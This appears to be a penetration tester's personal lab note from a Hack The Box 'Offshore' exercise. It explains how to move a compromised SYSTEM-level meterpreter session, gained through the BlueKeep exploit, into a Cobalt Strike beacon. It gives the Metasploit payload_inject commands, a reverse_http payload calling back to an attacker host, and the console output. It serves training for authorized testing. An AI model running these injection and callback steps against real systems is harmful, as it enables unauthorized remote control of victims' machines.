---
created_date: 27 October 2023
updated_date: TBD
type: Windows
tags:
  - "#cobaltstrike"
  - "#meterpreter"
  - "#msfconsole"
---
url links:
https://www.cobaltstrike.com/blog/interoperability-with-the-metasploit-framework

note links: 
[[Penetration Testing v2/htb_pro_Labs/offshore/172.16.1.101 - CORP-WS02/Initial Access & Flag]]

setup listener on `cobaltstrike` with parameters below
`payload windows/beacon_http/reverse_http`
![[Pasted image 20231027152342.png]]
in already exploited session press `ctrl + z` in meterpreter shell to background the `shell`session if in a shell
```bash
c:\Users\wsadmin\Desktop>^Z                                                                                                                             
Background channel 1? [y/N]  y     
```
background the meterpreter session with `ctrl + z` again
```bash
meterpreter >                                                                                                                                           
Background session 1? [y/N]  y   
```
`sessions` to ensure that the session was properly backgrounded
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > sessions             
                                                                                                                                                        
Active sessions                                                             
===============                                                             
                                                                            
  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WS02  10.10.14.39:8443 -> 10.10.110.3:37353 (172.16.1.101)
```
once backgrounded `use exploit/windows/local/payload_inject`
- `set PAYLOAD windows/x64/meterpreter/reverse_http` the x64 bit payload did not work for me, keep that in mind.
```bash
msf6 exploit(windows/local/payload_inject) > use exploit/windows/local/payload_inject  
```
`show options`
```bash
msf6 exploit(windows/local/payload_inject) > show options                                                                                               
                                                                                                                                                        
Module options (exploit/windows/local/payload_inject):                                                                                                  
                                                                                                                                                        
   Name         Current Setting  Required  Description                                                                                                  
   ----         ---------------  --------  -----------                                                                                                  
   AUTOUNHOOK   false            no        Auto remove EDRs hooks                                                                                       
   PID          0                no        Process Identifier to inject of process to inject payload. 0=New Process                                     
   PPID         0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)                     
   SESSION                       yes       The session to run this module on                                                                            
   WAIT_UNHOOK  5                yes       Seconds to wait for unhook to be executed  
```
`set lhost 10.10.14.39` // cobalt strike server // probably kali host
`set lport 80` // port that the cobalt beacon is listening on
`set DisablePayloadHandler True` // because we dont need a handler, cobalt beacon is handling it
`sessions` // to get active sessions to set it correctly
`set PAYLOAD windows/meterpreter/reverse_http` // setting correct payload
```bash
msf6 exploit(windows/local/payload_inject) > set lhost 10.10.14.39                                                                                      
lhost => 10.10.14.39                                                                                                                                    
msf6 exploit(windows/local/payload_inject) > set lport 80                                                                                               
lport => 80                                                                                                                                             
msf6 exploit(windows/local/payload_inject) > set DisablePayloadHandler True                                                                             
DisablePayloadHandler => true
msf6 exploit(windows/local/payload_inject) > set PAYLOAD windows/meterpreter/reverse_http                                                               
PAYLOAD => windows/meterpreter/reverse_http            
msf6 exploit(windows/local/payload_inject) > sessions                                                                                                   
                                                                                                                                                        
Active sessions                                                                                                                                         
===============                                                                                                                                         
                                                                                                                                                        
  Id  Name  Type                     Information                 Connection                                                                             
  --  ----  ----                     -----------                 ----------                                                                             
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WS02  10.10.14.39:8443 -> 10.10.110.3:37353 (172.16.1.101)                                   
                                                                                                                                                        
msf6 exploit(windows/local/payload_inject) > set session 1                                                                                              
session => 1                                                                                                          
```
`unset proxy` 
- making sure that proxy isnt set so we can hit our teams server
```bash
msf6 exploit(windows/local/payload_inject) > unset proxy
Unsetting proxy...
```
`exploit -j` 
- detonate exploit and run in background

```bash
msf6 exploit(windows/local/payload_inject) > exploit -j                                                                                                 
[*] Exploit running as background job 1.                    
[*] Running module against WS02
[*] Spawned Notepad process 3020
[*] Injecting payload into 3020
[*] Preparing 'windows/meterpreter/reverse_http' for PID 3020

```
on as system beacon now :D 
![[Pasted image 20231027160104.png]]